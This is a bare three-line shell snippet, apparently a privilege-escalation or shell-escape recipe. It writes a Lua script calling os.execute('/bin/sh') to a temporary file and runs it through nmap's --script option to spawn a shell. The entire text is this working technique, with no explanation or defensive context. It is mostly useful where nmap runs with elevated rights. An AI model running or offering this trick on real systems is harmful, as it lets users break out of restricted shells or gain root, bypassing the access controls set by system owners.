TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF

nmap --script=$TF
